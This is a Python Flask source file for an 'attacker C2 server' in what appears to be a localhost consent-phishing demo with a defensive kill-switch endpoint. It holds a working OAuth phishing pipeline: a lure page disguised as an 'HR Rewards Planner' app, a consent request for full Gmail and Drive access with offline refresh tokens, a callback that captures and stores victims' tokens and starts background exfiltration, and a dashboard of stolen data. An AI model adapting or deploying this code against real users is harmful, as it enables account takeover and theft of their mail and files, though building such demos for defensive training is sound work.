"""
Attacker C2 Server — Port 5001
================================
Hosts:
  /          — Phishing lure (convincing landing page)
  /authorize — Crafts malicious OAuth redirect to Google
  /callback  — Intercepts auth code, swaps for tokens, runs exfil
  /c2        — Attacker dashboard showing all stolen tokens
  /evict/<id> — Kill switch receiver (defensive team calls this)
  /api/tokens — JSON API for token list
"""

import os
import json
import time
import threading
import requests
from flask import Flask, redirect, request, session, jsonify, render_template
from flask_cors import CORS
from dotenv import load_dotenv

# Google OAuth
from google_auth_oauthlib.flow import Flow
import google.auth.transport.requests

from token_decoder import decode_token
from token_store import add as store_token, get_all, evict, add_exfil
from exfiltrator import run_full_exfil

load_dotenv()

# Allow HTTP for localhost demo
os.environ["OAUTHLIB_INSECURE_TRANSPORT"] = "1"
# Google returns canonical scope URLs which differ from shorthand aliases
# (e.g. "email" -> "https://www.googleapis.com/auth/userinfo.email").
# This tells requests-oauthlib to accept scope changes instead of raising.
os.environ["OAUTHLIB_RELAX_TOKEN_SCOPE"] = "1"

app = Flask(__name__)
app.secret_key = os.urandom(24)
CORS(app, origins=["http://localhost:5000", "http://localhost:5173"])

# ── Paths ─────────────────────────────────────────────────────────────────────

BASE_DIR    = os.path.dirname(os.path.abspath(__file__))
EVENTS_LOG  = os.path.join(BASE_DIR, "../shared/events_log.json")
CLIENT_SEC  = os.path.join(BASE_DIR, "client_secret.json")

# ── Dangerous scopes — this is the "weaponized" consent request ───────────────

# Use canonical scope URLs that Google actually returns in the token response.
# Shorthand aliases like "email" and "profile" get expanded by Google, which
# causes requests-oauthlib to flag a scope mismatch. Using the full URLs avoids
# that warning even with OAUTHLIB_RELAX_TOKEN_SCOPE as a belt-and-suspenders fix.
SCOPES = [
    "openid",
    "https://www.googleapis.com/auth/userinfo.email",    # canonical "email"
    "https://www.googleapis.com/auth/userinfo.profile",  # canonical "profile"
    "https://mail.google.com/",                          # Full Gmail (trailing slash matches Google's response)
    "https://www.googleapis.com/auth/drive",             # Full Drive access
]

# ── Helpers ──────────────────────────────────────────────────────────────────

def make_flow() -> Flow:
    return Flow.from_client_secrets_file(
        CLIENT_SEC,
        scopes=SCOPES,
        redirect_uri="http://localhost:5001/callback"
    )


def append_event(record: dict):
    """Thread-safe append to shared events log."""
    lock = threading.Lock()
    with lock:
        try:
            with open(EVENTS_LOG, "r") as f:
                events = json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            events = []
        events.append(record)
        with open(EVENTS_LOG, "w") as f:
            json.dump(events, f, indent=2)


# In-memory PKCE code verifier store to bypass browser session/cookie drop issues on localhost
pkce_verifier_store = {}


# ── Routes ────────────────────────────────────────────────────────────────────

@app.route("/")
def lure():
    """
    The phishing lure — disguised as a legitimate corporate tool.
    Looks like 'HR Rewards Planner'. Victim sees nothing suspicious.
    """
    return render_template("lure.html")


@app.route("/authorize")
def authorize():
    """Craft the malicious authorization URL and redirect victim."""
    flow = make_flow()
    auth_url, state = flow.authorization_url(
        prompt="consent",
        access_type="offline",    # requests refresh_token
        include_granted_scopes="true"
    )
    session["oauth_state"] = state
    session["code_verifier"] = flow.code_verifier
    
    # Store in memory using state as key to avoid cookie domain mismatch issues
    pkce_verifier_store[state] = flow.code_verifier
    
    # Log the attempt
    append_event({
        "type": "auth_attempt",
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S"),
        "message": "Victim clicked authorize — redirecting to Google consent screen",
        "scopes_requested": SCOPES
    })
    return redirect(auth_url)


@app.route("/callback")
def callback():
    """
    C2 Callback — The core of the attack.
    Google redirects here with ?code=XYZ after victim consents.
    We swap the code for tokens and immediately run exfiltration.
    """
    # 1. Exchange authorization code for tokens
    state = request.args.get("state")
    flow = Flow.from_client_secrets_file(
        CLIENT_SEC,
        scopes=SCOPES,
        state=state,
        redirect_uri="http://localhost:5001/callback"
    )
    
    # Restore code verifier from in-memory store or session
    code_verifier = pkce_verifier_store.get(state) or session.get("code_verifier")

    # Pass code_verifier directly to fetch_token — this is the correct API.
    # Setting flow.code_verifier as an attribute does NOT work; the verifier
    # must be forwarded as a kwarg so it ends up in the token POST body.
    flow.fetch_token(
        authorization_response=request.url,
        code_verifier=code_verifier   # <-- fix: replaces broken attribute assignments
    )
    creds = flow.credentials

    # 2. Decode ID token to get victim identity
    claims = {}
    if creds.id_token:
        claims = decode_token(creds.id_token)

    email        = claims.get("email", "unknown@victim.com")
    access_token = creds.token or ""
    refresh_token= creds.refresh_token or ""

    # 3. Store stolen credentials
    tid = store_token(
        email=email,
        scopes=SCOPES,
        id_token=creds.id_token or "",
        refresh_token=refresh_token,
        access_token=access_token
    )

    # 4. Write event to shared log so defensive backend picks it up
    append_event({
        "type":          "token_captured",
        "token_id":      tid,
        "app_name":      "HR Rewards Planner",
        "email":         email,
        "scopes":        SCOPES,
        "has_refresh":   bool(refresh_token),
        "token_preview": access_token[:40] if access_token else "N/A",
        "timestamp":     time.strftime("%Y-%m-%dT%H:%M:%S"),
        "status":        "active"
    })

    # 5. Run exfiltration in background thread (don't block the response)
    def do_exfil():
        if access_token and access_token != "N/A":
            data = run_full_exfil(access_token)
            add_exfil(tid, data)
            # Update the event log with exfil confirmation
            append_event({
                "type":      "exfil_complete",
                "token_id":  tid,
                "email":     email,
                "records":   len(data),
                "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S"),
                "status":    "active"
            })

    t = threading.Thread(target=do_exfil, daemon=True)
    t.start()

    return redirect(f"/c2?tid={tid}&new=1")


@app.route("/c2")
def c2():
    """Attacker C2 dashboard — shows all stolen tokens and exfiltrated data."""
    tokens   = get_all()
    highlight = request.args.get("tid")
    is_new    = request.args.get("new") == "1"
    return render_template("c2.html", tokens=tokens,
                           highlight=highlight, is_new=is_new)


# ── Kill switch receiver — defensive backend calls this ───────────────────────

@app.route("/evict/<tid>", methods=["POST"])
def evict_token(tid: str):
    """
    Defensive team's kill switch lands here.
    Marks token as evicted — simulates Google revoking it.
    In a real scenario this would also call google.oauth2.credentials.revoke().
    """
    success = evict(tid)

    # Update shared events log so defensive dashboard shows the eviction
    try:
        with open(EVENTS_LOG, "r") as f:
            events = json.load(f)
        for e in events:
            if e.get("token_id") == tid:
                e["status"] = "evicted"
        with open(EVENTS_LOG, "w") as f:
            json.dump(events, f, indent=2)
    except Exception:
        pass

    append_event({
        "type":      "token_evicted",
        "token_id":  tid,
        "by":        "defensive_kill_switch",
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S"),
        "status":    "evicted"
    })

    return jsonify({"evicted": success, "token_id": tid})


@app.route("/api/tokens")
def api_tokens():
    return jsonify(get_all())


if __name__ == "__main__":
    print("\n[OFFENSIVE] Attacker C2 running at http://localhost:5001")
    print("[OFFENSIVE] Send victims to http://localhost:5001/\n")
    app.run(port=5001, debug=True, use_reloader=False)